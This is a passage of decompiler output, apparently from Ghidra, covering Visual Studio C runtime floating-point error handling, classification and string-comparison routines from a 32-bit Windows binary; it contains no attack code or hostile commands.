        iVar5 = 0x10;
      }
      return (float10)(((dVar12 * -3.071795256153705 + 1.775881635348345) * dVar12 +
                       -1.155016766740187) * dVar12 * dVar12 +
                       ((dVar9 * 21.53547326284658 + -10.89355785277636) * dVar9 + 5.667600603343536
                       ) * dVar9 * dVar9 * dVar9 * dVar9 * dVar9 + dVar9 * 0.001616102407499711 +
                       *(double *)(&UNK_00418d48 + uVar1) + dVar11 * 2.836339455104496e-14 +
                       (double)((ulonglong)dVar8 & *(ulonglong *)(&UNK_00418b78 + iVar5)) +
                      *(double *)(&DAT_00418d40 + uVar1) + dVar10 + dVar11 * 0.3010299956639528 +
                      (double)((ulonglong)dVar7 & *(ulonglong *)(&DAT_00418b70 + iVar5)));
    }
    local_c = (double)-(ulonglong)(param_1 == 0.0);
    if (SUB82(local_c,0) != 0) break;
    if (uVar3 != 0xffffffff) {
      if (uVar3 < 0x7ff) {
        local_c = 2.225073858507201e-308;
        if ((double)((ulonglong)param_1 & 0xfffffffffffff | 0x3ff0000000000000) == 1.0) {
          return (float10)INFINITY;
        }
        iVar4 = 0x3e9;
      }
      else if (((uVar2 & 0x7ff) < 0x7ff) ||
              ((SUB84(param_1,0) | (uint)((ulonglong)param_1 >> 0x20) & 0xfffff) == 0)) {
        local_c = -NAN;
        iVar4 = 9;
      }
      else {
        iVar4 = 0x3e9;
      }
      goto LAB_0041126a;
    }
    in_XMM0 = CONCAT88(dVar12,param_1 * 4503599627370496.0);
    iVar4 = -0x34;
  }
  local_c = -INFINITY;
  iVar4 = 8;
LAB_0041126a:
  ___libm_error_support(&param_1,&param_1,&local_c,iVar4);
  return (float10)local_c;
}



undefined4 FUN_004116fc(void)

{
  uint in_EAX;
  
  if ((in_EAX & 0x80000) != 0) {
    return 0;
  }
  return 0;
}



uint __cdecl FUN_00411758(undefined4 param_1,uint param_2)

{
  if ((param_2 & 0x7ff00000) != 0x7ff00000) {
    return param_2 & 0x7ff00000;
  }
  return param_2;
}



float10 __fastcall
FUN_00411860(undefined4 param_1,int param_2,ushort param_3,undefined4 param_4,undefined4 param_5,
            undefined4 param_6,undefined4 param_7,undefined4 param_8)

{
  float10 in_ST0;
  int local_24;
  undefined4 uStack32;
  undefined4 uStack28;
  undefined4 uStack24;
  undefined4 local_14;
  undefined4 local_10;
  double dStack12;
  
  local_14 = param_7;
  local_10 = param_8;
  dStack12 = (double)in_ST0;
  uStack28 = param_5;
  uStack24 = param_6;
  uStack32 = param_1;
  __87except(param_2,&local_24,&param_3);
  return (float10)dStack12;
}



// Library Function - Single Match
//  __startOneArgErrorHandling
// 
// Library: Visual Studio 2015 Release

float10 __fastcall
__startOneArgErrorHandling
          (undefined4 param_1,int param_2,ushort param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  float10 in_ST0;
  int local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  double local_c;
  
  local_c = (double)in_ST0;
  local_1c = param_5;
  local_18 = param_6;
  local_20 = param_1;
  __87except(param_2,&local_24,&param_3);
  return (float10)local_c;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___libm_error_support
// 
// Library: Visual Studio 2015 Release

void __cdecl
___libm_error_support(undefined8 *param_1,undefined8 *param_2,undefined8 *param_3,int param_4)

{
  undefined8 uVar1;
  uint uVar2;
  code *pcVar3;
  int iVar4;
  int *piVar5;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined *puVar6;
  undefined in_stack_ffffffd8;
  undefined8 local_10;
  
  uVar2 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  if (_DAT_0041c238 == 0) {
    pcVar3 = ___acrt_invoke_user_matherr;
  }
  else {
    pcVar3 = (code *)DecodePointer(DAT_0041ceb0);
    in_DL = extraout_DL;
  }
  if (param_4 < 0x1b) {
    if (param_4 != 0x1a) {
      if (param_4 < 0xf) {
        if (param_4 == 0xe) {
          in_stack_ffffffd8 = 3;
        }
        else {
          if (param_4 != 2) {
            if (param_4 != 3) {
              if (param_4 == 8) {
                in_stack_ffffffd8 = 2;
                goto LAB_00411a80;
              }
              if (param_4 != 9) goto LAB_00411abb;
            }
LAB_00411927:
            in_stack_ffffffd8 = 1;
            puVar6 = &stack0xffffffd8;
            local_10 = *param_3;
            _guard_check_icall();
            iVar4 = (*pcVar3)(puVar6);
            in_DL = extraout_DL_00;
            if (iVar4 == 0) {
              piVar5 = __errno();
              *piVar5 = 0x21;
              in_DL = extraout_DL_01;
            }
            goto LAB_00411ab6;
          }
          in_stack_ffffffd8 = 2;
        }
LAB_00411a80:
        puVar6 = &stack0xffffffd8;
        local_10 = *param_3;
        _guard_check_icall();
        iVar4 = (*pcVar3)(puVar6);
        in_DL = extraout_DL_03;
        if (iVar4 == 0) {
          piVar5 = __errno();
          *piVar5 = 0x22;
          in_DL = extraout_DL_04;
        }
      }
      else {
        if (param_4 != 0xf) {
          if (param_4 == 0x18) {
            in_stack_ffffffd8 = 3;
            goto LAB_00411a80;
          }
          if (param_4 != 0x19) goto LAB_00411abb;
        }
        in_stack_ffffffd8 = 4;
        puVar6 = &stack0xffffffd8;
        local_10 = *param_3;
        _guard_check_icall();
        (*pcVar3)(puVar6);
        in_DL = extraout_DL_02;
      }
LAB_00411ab6:
      *param_3 = local_10;
      goto LAB_00411abb;
    }
    uVar1 = 0x3ff0000000000000;
  }
  else {
    if (param_4 == 0x1b) {
      in_stack_ffffffd8 = 2;
      goto LAB_00411a80;
    }
    if ((((param_4 == 0x1c) || (param_4 == 0x31)) || (param_4 == 0x3a)) || (param_4 == 0x3d))
    goto LAB_00411927;
    if ((param_4 != 1000) && (param_4 != 0x3e9)) goto LAB_00411abb;
    uVar1 = *param_1;
  }
  *param_3 = uVar1;
LAB_00411abb:
  FUN_0040296a(uVar2 ^ (uint)&stack0xfffffffc,in_DL,in_stack_ffffffd8);
  return;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  byte bVar1;
  byte bVar2;
  bool bVar3;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      bVar1 = *_Str2;
      if ((bVar2 == 0) || (bVar1 == 0)) break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = (char *)((byte *)_Str2 + 1);
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        bVar2 = bVar2 + 0x20;
      }
      if ((0x40 < bVar1) && (bVar1 < 0x5b)) {
        bVar1 = bVar1 + 0x20;
      }
      bVar3 = bVar2 < bVar1;
      if (bVar2 != bVar1) goto LAB_00411be1;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar3 = bVar2 < bVar1;
    if (bVar2 != bVar1) {
LAB_00411be1:
      _MaxCount = 0xffffffff;
      if (!bVar3) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



// Library Function - Single Match
//  __d_inttype
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

undefined4 __cdecl __d_inttype(double param_1)

{
  uint uVar1;
  float10 fVar2;
  float10 fVar3;
  
  uVar1 = __fpclass(param_1);
  if ((uVar1 & 0x90) == 0) {
    fVar2 = __frnd(param_1);
    if ((float10)param_1 == fVar2) {
      fVar2 = (float10)param_1 * (float10)0.5;
      fVar3 = __frnd((double)fVar2);
      if ((float10)(double)fVar2 == fVar3) {
        return 2;
      }
      return 1;
    }
  }
  return 0;
}



// Library Function - Single Match
//  __powhlp
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

undefined4 __cdecl __powhlp(int param_1,int param_2,int param_3,int param_4,undefined8 *param_5)

{
  double dVar1;
  undefined8 uVar2;
  int iVar3;
  
  dVar1 = ABS((double)CONCAT44(param_2,param_1));
  if (param_4 == 0x7ff00000) {
    if (param_3 != 0) goto LAB_00411cef;
    uVar2 = 0x3ff0000000000000;
    if (dVar1 <= 1.0) {
      if ((ushort)((ushort)(1.0 < dVar1) << 8 | (ushort)(dVar1 == 1.0) << 0xe) == 0) {
        uVar2 = 0;
      }
      goto LAB_00411d80;
    }
  }
  else {
    if ((param_4 == -0x100000) && (param_3 == 0)) {
      if (dVar1 <= 1.0) {
        uVar2 = 0x3ff0000000000000;
        if ((ushort)((ushort)(1.0 < dVar1) << 8 | (ushort)(dVar1 == 1.0) << 0xe) == 0) {
          uVar2 = 0x7ff0000000000000;
        }
      }
      else {
        uVar2 = 0;
      }
      goto LAB_00411d80;
    }
LAB_00411cef:
    if (param_2 != 0x7ff00000) {
      if (param_2 != -0x100000) {
        return 0;
      }
      if (param_1 != 0) {
        return 0;
      }
      iVar3 = __d_inttype((double)CONCAT44(param_4,param_3));
      uVar2 = 0;
      dVar1 = (double)CONCAT44(param_4,param_3);
      if ((ushort)((ushort)(dVar1 < 0.0) << 8 | (ushort)(dVar1 == 0.0) << 0xe) == 0) {
        uVar2 = 0x7ff0000000000000;
        if (iVar3 == 1) {
          uVar2 = 0xfff0000000000000;
        }
      }
      else if (0.0 <= dVar1) {
        uVar2 = 0x3ff0000000000000;
      }
      else if (iVar3 == 1) {
        uVar2 = 0x8000000000000000;
      }
      goto LAB_00411d80;
    }
    if (param_1 != 0) {
      return 0;
    }
    dVar1 = (double)CONCAT44(param_4,param_3);
    if ((ushort)((ushort)(dVar1 < 0.0) << 8 | (ushort)(dVar1 == 0.0) << 0xe) != 0) {
      uVar2 = 0;
      if (0.0 <= dVar1) {
        uVar2 = 0x3ff0000000000000;
      }
      goto LAB_00411d80;
    }
  }
  uVar2 = 0x7ff0000000000000;
LAB_00411d80:
  *param_5 = uVar2;
  return 0;
}



// Library Function - Single Match
//  __87except
// 
// Library: Visual Studio 2015 Release

void __cdecl __87except(int param_1,int *param_2,ushort *param_3)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  uint uVar4;
  undefined in_stack_ffffff68;
  uint local_94;
  uint local_90 [12];
  undefined8 local_60;
  uint local_50;
  uint local_14;
  
  local_14 = DAT_0041b004 ^ (uint)&stack0xfffffff0;
  local_94 = (uint)*param_3;
  iVar2 = *param_2;
  if (iVar2 == 1) {
LAB_00411dee:
    uVar4 = 8;
  }
  else if (iVar2 == 2) {
    uVar4 = 4;
  }
  else if (iVar2 == 3) {
    uVar4 = 0x11;
  }
  else if (iVar2 == 4) {
    uVar4 = 0x12;
  }
  else {
    if (iVar2 == 5) goto LAB_00411dee;
    if (iVar2 != 8) goto LAB_00411e50;
    uVar4 = 0x10;
  }
  bVar1 = __handle_exc(uVar4,(double *)(param_2 + 6),local_94);
  if (CONCAT31(extraout_var,bVar1) == 0) {
    if (((param_1 == 0x10) || (param_1 == 0x16)) || (param_1 == 0x1d)) {
      local_60 = *(undefined8 *)(param_2 + 4);
      local_50 = local_50 & 0xffffffe3 | 3;
    }
    else {
      local_50 = local_50 & 0xfffffffe;
    }
    __raise_exc(local_90,&local_94,uVar4,param_1,(undefined8 *)(param_2 + 2),
                (undefined8 *)(param_2 + 6));
  }
LAB_00411e50:
  __ctrlfp(local_94,0xffff);
  if (((*param_2 == 8) || (bVar1 = ___acrt_has_user_matherr(), !bVar1)) ||
     (iVar2 = ___acrt_invoke_user_matherr(param_2), uVar3 = extraout_DL, iVar2 == 0)) {
    __set_errno_from_matherr(*param_2);
    uVar3 = extraout_DL_00;
  }
  FUN_0040296a(local_14 ^ (uint)&stack0xfffffff0,uVar3,in_stack_ffffff68);
  return;
}



// Library Function - Single Match
//  __frnd
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

float10 __cdecl __frnd(double param_1)

{
  return (float10)ROUND(param_1);
}



// Library Function - Single Match
//  __errcode
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

int __cdecl __errcode(uint param_1)

{
  int iStack8;
  
  if ((param_1 & 0x20) == 0) {
    if ((param_1 & 8) != 0) {
      return 1;
    }
    if ((param_1 & 4) == 0) {
      if ((param_1 & 1) == 0) {
        return (param_1 & 2) * 2;
      }
      iStack8 = 3;
    }
    else {
      iStack8 = 2;
    }
  }
  else {
    iStack8 = 5;
  }
  return iStack8;
}



// Library Function - Single Match
//  __except1
// 
// Library: Visual Studio 2015 Release

void __cdecl __except1(uint param_1,int param_2,undefined8 param_3,double param_4,uint param_5)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  uint uVar4;
  undefined in_stack_ffffff68;
  uint local_90 [16];
  uint local_50;
  uint local_14;
  
  uVar4 = param_5;
  local_14 = DAT_0041b004 ^ (uint)&stack0xfffffff0;
  bVar1 = __handle_exc(param_1,&param_4,param_5);
  if (CONCAT31(extraout_var,bVar1) == 0) {
    local_50 = local_50 & 0xfffffffe;
    __raise_exc_ex(local_90,&param_5,param_1,param_2,&param_3,&param_4,0);
    uVar4 = param_5;
  }
  iVar2 = __errcode(param_1);
  bVar1 = ___acrt_has_user_matherr();
  if ((bVar1) && (iVar2 != 0)) {
    __umatherr(iVar2,param_2,(int)param_3,(int)((ulonglong)param_3 >> 0x20),0,0,SUB84(param_4,0),
               (int)((ulonglong)param_4 >> 0x20));
    uVar3 = extraout_DL;
  }
  else {
    __set_errno_from_matherr(iVar2);
    __ctrlfp(uVar4,0xffff);
    uVar3 = extraout_DL_00;
  }
  FUN_0040296a(local_14 ^ (uint)&stack0xfffffff0,uVar3,in_stack_ffffff68);
  return;
}



// Library Function - Single Match
//  __handle_exc
// 
// Library: Visual Studio 2015 Release

bool __cdecl __handle_exc(uint param_1,double *param_2,uint param_3)

{
  double dVar1;
  float10 fVar2;
  int iVar3;
  uint uVar4;
  bool bVar5;
  float10 fVar6;
  float10 fVar7;
  uint local_14;
  byte bStack16;
  undefined uStack15;
  ushort uStack14;
  int local_8;
  
  uVar4 = param_1 & 0x1f;
  if (((param_1 & 8) != 0) && ((param_3 & 1) != 0)) {
    __set_statfp(1);
    uVar4 = param_1 & 0x17;
    goto LAB_00412166;
  }
  if ((param_1 & param_3 & 4) != 0) {
    __set_statfp(4);
    uVar4 = param_1 & 0x1b;
    goto LAB_00412166;
  }
  if (((param_1 & 1) == 0) || ((param_3 & 8) == 0)) {
    if (((param_1 & 2) != 0) && ((param_3 & 0x10) != 0)) {
      bVar5 = (param_1 & 0x10) != 0;
      if (*param_2 == 0.0) {
        bVar5 = true;
      }
      else {
        fVar6 = (float10)__decomp(SUB84(*param_2,0),(uint)((ulonglong)*param_2 >> 0x20),&local_8);
        local_8 = local_8 + -0x600;
        dVar1 = (double)fVar6;
        local_14 = SUB84(dVar1,0);
        bStack16 = (byte)((ulonglong)dVar1 >> 0x20);
        uStack15 = (undefined)((ulonglong)dVar1 >> 0x28);
        uStack14 = (ushort)((ulonglong)dVar1 >> 0x30);
        fVar2 = (float10)0;
        if (local_8 < -0x432) {
          fVar7 = fVar2 * fVar6;
          bVar5 = true;
        }
        else {
          uStack14 = uStack14 & 0xf | 0x10;
          if (local_8 < -0x3fd) {
            iVar3 = -0x3fd - local_8;
            do {
              if (((local_14 & 1) != 0) && (!bVar5)) {
                bVar5 = true;
              }
              local_14 = local_14 >> 1;
              if ((bStack16 & 1) != 0) {
                local_14 = local_14 | 0x80000000;
              }
              uVar4 = CONCAT22(uStack14,CONCAT11(uStack15,bStack16)) >> 1;
              bStack16 = (byte)uVar4;
              uStack15 = (undefined)(uVar4 >> 8);
              uStack14 = uStack14 >> 1;
              iVar3 = iVar3 + -1;
            } while (iVar3 != 0);
          }
          fVar7 = (float10)(double)CONCAT26(uStack14,CONCAT15(uStack15,CONCAT14(bStack16,local_14)))
          ;
          if ((ushort)((ushort)(fVar2 < fVar6) << 8 | (ushort)(fVar2 == fVar6) << 0xe) == 0) {
            fVar7 = -fVar7;
          }
        }
        *param_2 = (double)fVar7;
      }
      if (bVar5) {
        __set_statfp(0x10);
      }
      uVar4 = param_1 & 0x1d;
    }
    goto LAB_00412166;
  }
  __set_statfp(8);
  uVar4 = param_3 & 0xc00;
  if (uVar4 == 0) {
    if (*param_2 <= 0.0) {
LAB_00412080:
      dVar1 = INFINITY;
      goto LAB_00412086;
    }
LAB_00412078:
    dVar1 = INFINITY;
LAB_00412088:
    *param_2 = dVar1;
  }
  else {
    if (uVar4 == 0x400) {
      if (*param_2 <= 0.0) goto LAB_00412080;
      dVar1 = 1.797693134862316e+308;
      goto LAB_00412088;
    }
    if (uVar4 == 0x800) {
      if (0.0 < *param_2) goto LAB_00412078;
      dVar1 = 1.797693134862316e+308;
LAB_00412086:
      dVar1 = -dVar1;
      goto LAB_00412088;
    }
    if (uVar4 == 0xc00) {
      dVar1 = 1.797693134862316e+308;
      if (0.0 < *param_2) goto LAB_00412088;
      goto LAB_00412086;
    }
  }
  uVar4 = param_1 & 0x1e;
LAB_00412166:
  if (((param_1 & 0x10) != 0) && ((param_3 & 0x20) != 0)) {
    __set_statfp(0x20);
    uVar4 = uVar4 & 0xffffffef;
  }
  return uVar4 == 0;
}



// Library Function - Single Match
//  __raise_exc
// 
// Library: Visual Studio 2015 Release

void __cdecl
__raise_exc(uint *param_1,uint *param_2,uint param_3,int param_4,undefined8 *param_5,
           undefined8 *param_6)

{
  __raise_exc_ex(param_1,param_2,param_3,param_4,param_5,param_6,0);
  return;
}



// Library Function - Single Match
//  __raise_exc_ex
// 
// Library: Visual Studio 2015 Release

void __cdecl
__raise_exc_ex(uint *param_1,uint *param_2,uint param_3,int param_4,undefined8 *param_5,
              undefined8 *param_6,int param_7)

{
  uint *puVar1;
  undefined8 *puVar2;
  uint uVar3;
  DWORD dwExceptionCode;
  
  puVar1 = param_2;
  param_1[1] = 0;
  dwExceptionCode = 0xc000000d;
  param_1[2] = 0;
  param_1[3] = 0;
  if ((param_3 & 0x10) != 0) {
    dwExceptionCode = 0xc000008f;
    param_1[1] = param_1[1] | 1;
  }
  if ((param_3 & 2) != 0) {
    dwExceptionCode = 0xc0000093;
    param_1[1] = param_1[1] | 2;
  }
  if ((param_3 & 1) != 0) {
    dwExceptionCode = 0xc0000091;
    param_1[1] = param_1[1] | 4;
  }
  if ((param_3 & 4) != 0) {
    dwExceptionCode = 0xc000008e;
    param_1[1] = param_1[1] | 8;
  }
  if ((param_3 & 8) != 0) {
    dwExceptionCode = 0xc0000090;
    param_1[1] = param_1[1] | 0x10;
  }
  param_1[2] = param_1[2] ^ (~(*param_2 << 4) ^ param_1[2]) & 0x10;
  param_1[2] = param_1[2] ^ (~(*param_2 * 2) ^ param_1[2]) & 8;
  param_1[2] = param_1[2] ^ (~(*param_2 >> 1) ^ param_1[2]) & 4;
  param_1[2] = param_1[2] ^ (~(*param_2 >> 3) ^ param_1[2]) & 2;
  param_1[2] = param_1[2] ^ (~(*param_2 >> 5) ^ param_1[2]) & 1;
  uVar3 = __statfp();
  puVar2 = param_6;
  if ((uVar3 & 1) != 0) {
    param_1[3] = param_1[3] | 0x10;
  }
  if ((uVar3 & 4) != 0) {
    param_1[3] = param_1[3] | 8;
  }
  if ((uVar3 & 8) != 0) {
    param_1[3] = param_1[3] | 4;
  }
  if ((uVar3 & 0x10) != 0) {
    param_1[3] = param_1[3] | 2;
  }
  if ((uVar3 & 0x20) != 0) {
    param_1[3] = param_1[3] | 1;
  }
  uVar3 = *puVar1 & 0xc00;
  if (uVar3 == 0) {
    *param_1 = *param_1 & 0xfffffffc;
  }
  else {
    if (uVar3 == 0x400) {
      uVar3 = *param_1 & 0xfffffffd | 1;
    }
    else {
      if (uVar3 != 0x800) {
        if (uVar3 == 0xc00) {
          *param_1 = *param_1 | 3;
        }
        goto LAB_0041230e;
      }
      uVar3 = *param_1 & 0xfffffffe | 2;
    }
    *param_1 = uVar3;
  }
LAB_0041230e:
  uVar3 = *puVar1 & 0x300;
  if (uVar3 == 0) {
    uVar3 = *param_1 & 0xffffffeb | 8;
LAB_00412344:
    *param_1 = uVar3;
  }
  else {
    if (uVar3 == 0x200) {
      uVar3 = *param_1 & 0xffffffe7 | 4;
      goto LAB_00412344;
    }
    if (uVar3 == 0x300) {
      *param_1 = *param_1 & 0xffffffe3;
    }
  }
  *param_1 = *param_1 ^ (param_4 << 5 ^ *param_1) & 0x1ffe0;
  param_1[8] = param_1[8] | 1;
  if (param_7 == 0) {
    param_1[8] = param_1[8] & 0xffffffe3 | 2;
    *(undefined8 *)(param_1 + 4) = *param_5;
    param_1[0x18] = param_1[0x18] | 1;
    param_1[0x18] = param_1[0x18] & 0xffffffe3 | 2;
    *(undefined8 *)(param_1 + 0x14) = *param_6;
  }
  else {
    param_1[8] = param_1[8] & 0xffffffe1;
    param_1[4] = *(uint *)param_5;
    param_1[0x18] = param_1[0x18] | 1;
    param_1[0x18] = param_1[0x18] & 0xffffffe1;
    param_1[0x14] = *(uint *)param_6;
  }
  __clrfp();
  RaiseException(dwExceptionCode,0,1,(ULONG_PTR *)&param_1);
  if ((*(byte *)(param_1 + 2) & 0x10) != 0) {
    *puVar1 = *puVar1 & 0xfffffffe;
  }
  if ((*(byte *)(param_1 + 2) & 8) != 0) {
    *puVar1 = *puVar1 & 0xfffffffb;
  }
  if ((*(byte *)(param_1 + 2) & 4) != 0) {
    *puVar1 = *puVar1 & 0xfffffff7;
  }
  if ((*(byte *)(param_1 + 2) & 2) != 0) {
    *puVar1 = *puVar1 & 0xffffffef;
  }
  if ((*(byte *)(param_1 + 2) & 1) != 0) {
    *puVar1 = *puVar1 & 0xffffffdf;
  }
  uVar3 = *param_1 & 3;
  if (uVar3 == 0) {
    *puVar1 = *puVar1 & 0xfffff3ff;
  }
  else {
    if (uVar3 == 1) {
      uVar3 = *puVar1 & 0xfffff7ff | 0x400;
    }
    else {
      if (uVar3 != 2) {
        if (uVar3 == 3) {
          *puVar1 = *puVar1 | 0xc00;
        }
        goto LAB_00412455;
      }
      uVar3 = *puVar1 & 0xfffffbff | 0x800;
    }
    *puVar1 = uVar3;
  }
LAB_00412455:
  uVar3 = *param_1 >> 2 & 7;
  if (uVar3 == 0) {
    uVar3 = *puVar1 & 0xfffff3ff | 0x300;
  }
  else {
    if (uVar3 != 1) {
      if (uVar3 == 2) {
        *puVar1 = *puVar1 & 0xfffff3ff;
      }
      goto LAB_00412486;
    }
    uVar3 = *puVar1 & 0xfffff3ff | 0x200;
  }
  *puVar1 = uVar3;
LAB_00412486:
  if (param_7 == 0) {
    *puVar2 = *(undefined8 *)(param_1 + 0x14);
  }
  else {
    *(uint *)puVar2 = param_1[0x14];
  }
  return;
}



// Library Function - Single Match
//  __set_errno_from_matherr
// 
// Library: Visual Studio 2015 Release

void __cdecl __set_errno_from_matherr(int param_1)

{
  int *piVar1;
  
  if (param_1 == 1) {
    piVar1 = __errno();
    *piVar1 = 0x21;
  }
  else if (param_1 - 2U < 2) {
    piVar1 = __errno();
    *piVar1 = 0x22;
    return;
  }
  return;
}



// Library Function - Single Match
//  __umatherr
// 
// Library: Visual Studio 2015 Release

float10 __cdecl
__umatherr(int param_1,int param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6,undefined4 param_7,undefined4 param_8)

{
  double dVar1;
  int iVar2;
  undefined4 in_stack_00000024;
  int local_24;
  undefined *local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 uStack8;
  
  local_20 = (undefined *)0x0;
  iVar2 = 0;
  do {
    if ((&DAT_004195f8)[iVar2 * 2] == param_2) {
      local_20 = (&PTR_DAT_004195fc)[iVar2 * 2];
      break;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x1d);
  if (local_20 == (undefined *)0x0) {
    __ctrlfp(in_stack_00000024,0xffff);
    __set_errno_from_matherr(param_1);
    dVar1 = (double)CONCAT44(param_8,param_7);
  }
  else {
    local_1c = param_3;
    local_18 = param_4;
    local_14 = param_5;
    local_10 = param_6;
    local_c = param_7;
    local_24 = param_1;
    uStack8 = param_8;
    __ctrlfp(in_stack_00000024,0xffff);
    iVar2 = ___acrt_invoke_user_matherr(&local_24);
    if (iVar2 == 0) {
      __set_errno_from_matherr(param_1);
    }
    dVar1 = (double)CONCAT44(uStack8,local_c);
  }
  return (float10)dVar1;
}



// Library Function - Single Match
//  __decomp
// 
// Library: Visual Studio 2015 Release

void __cdecl __decomp(int param_1,uint param_2,int *param_3)

{
  uint uVar1;
  double dVar2;
  ushort uVar3;
  int iVar4;
  
  dVar2 = (double)CONCAT17(param_2._3_1_,CONCAT16(param_2._2_1_,CONCAT24((ushort)param_2,param_1)));
  if (dVar2 == 0.0) {
    iVar4 = 0;
  }
  else if (((param_2 & 0x7ff00000) == 0) && (((param_2 & 0xfffff) != 0 || (param_1 != 0)))) {
    iVar4 = -0x3fd;
    if ((param_2 & 0x100000) == 0) {
      do {
        uVar1 = param_2 * 2;
        param_2._0_2_ = (ushort)uVar1;
        param_2 = uVar1;
        if (param_1 < 0) {
          param_2 = uVar1 | 1;
        }
        param_1 = param_1 * 2;
        iVar4 = iVar4 + -1;
      } while ((uVar1 & 0x100000) == 0);
      param_2 = uVar1 & 0xffff0000 | (uint)(ushort)param_2;
    }
    uVar3 = (ushort)(param_2 >> 0x10) & 0xffef;
    param_2._2_1_ = (undefined)uVar3;
    param_2._3_1_ = (byte)(uVar3 >> 8);
    if ((ushort)((ushort)(0.0 < dVar2) << 8 | (ushort)(dVar2 == 0.0) << 0xe) == 0) {
      param_2._3_1_ = param_2._3_1_ | 0x80;
    }
    __set_exp(CONCAT17(param_2._3_1_,CONCAT16(param_2._2_1_,CONCAT24((ushort)param_2,param_1))),0);
  }
  else {
    __set_exp((ulonglong)dVar2,0);
    iVar4 = (param_2 >> 0x14 & 0x7ff) - 0x3fe;
  }
  *param_3 = iVar4;
  return;
}



// Library Function - Single Match
//  __set_exp
// 
// Library: Visual Studio 2015 Release

float10 __cdecl __set_exp(ulonglong param_1,short param_2)

{
  double local_c;
  
  local_c = (double)(param_1 & 0xffffffffffff |
                    (ulonglong)(ushort)((param_2 + 0x3fe) * 0x10 | param_1._6_2_ & 0x800f) << 0x30);
  return (float10)local_c;
}



// Library Function - Single Match
//  __sptype
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

undefined4 __cdecl __sptype(int param_1,uint param_2)

{
  undefined4 uStack8;
  
  if (param_2 == 0x7ff00000) {
    if (param_1 == 0) {
      return 1;
    }
  }
  else if ((param_2 == 0xfff00000) && (param_1 == 0)) {
    return 2;
  }
  if ((param_2._2_2_ & 0x7ff8) == 0x7ff8) {
    uStack8 = 3;
  }
  else {
    if (((param_2._2_2_ & 0x7ff8) != 0x7ff0) || (((param_2 & 0x7ffff) == 0 && (param_1 == 0)))) {
      return 0;
    }
    uStack8 = 4;
  }
  return uStack8;
}



// Library Function - Single Match
//  __fpclass
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

int __cdecl __fpclass(double _X)

{
  int iVar1;
  
  if ((_X._6_2_ & 0x7ff0) == 0x7ff0) {
    iVar1 = __sptype(_X._0_4_,(uint)((ulonglong)_X >> 0x20));
    if (iVar1 == 1) {
      return 0x200;
    }
    if (iVar1 == 2) {
      iVar1 = 4;
    }
    else {
      if (iVar1 != 3) {
        return 1;
      }
      iVar1 = 2;
    }
    return iVar1;
  }
  if ((((ulonglong)_X & 0x7ff0000000000000) == 0) &&
     ((((ulonglong)_X & 0xfffff00000000) != 0 || (_X._0_4_ != 0)))) {
    return (-(uint)(((ulonglong)_X & 0x8000000000000000) != 0) & 0xffffff90) + 0x80;
  }
  if (_X == 0.0) {
    return (-(uint)(((ulonglong)_X & 0x8000000000000000) != 0) & 0xffffffe0) + 0x40;
  }
  return (-(uint)(((ulonglong)_X & 0x8000000000000000) != 0) & 0xffffff08) + 0x100;
}



BOOL IsProcessorFeaturePresent(DWORD ProcessorFeature)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412774. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = IsProcessorFeaturePresent(ProcessorFeature);
  return BVar1;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x0041277a. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



// Library Function - Single Match
//  __FindPESection
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  uVar3 = 0;
  iVar1 = *(int *)(pImageBase + 0x3c);
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) && (rva < p_Var2->Misc + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2015 Release

